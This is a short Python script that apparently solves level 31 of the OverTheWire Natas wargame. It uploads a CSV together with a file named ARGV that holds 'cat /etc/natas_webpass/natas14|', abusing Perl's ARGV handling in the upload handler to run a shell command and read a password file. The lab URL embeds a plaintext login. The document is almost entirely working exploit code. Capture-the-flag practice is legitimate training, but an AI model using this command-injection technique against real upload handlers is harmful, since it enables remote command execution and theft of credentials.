import requests
session = requests.Session()

def natas31(url):
    with open('a.csv', 'wb') as _file:
        _file.write(b"a,b,c,d,e\n1,2,3,4\nasafe")

    with open('ARGV', 'wb') as _file:
        _file.write(b"cat /etc/natas_webpass/natas14|") 
    
    _files = [('upload_file', open('a.csv', 'rb')), ('upload_file', open('ARGV', 'rb'))]
    response = session.post(url, files=_files, data={"submit": "Upload"})
    print(response.text)

if __name__ == '__main__':
    url = 'http://natas31:hay7aecuungiuKaezuathuk9biin0pu1@natas31.natas.labs.overthewire.org/'
    natas31(url)
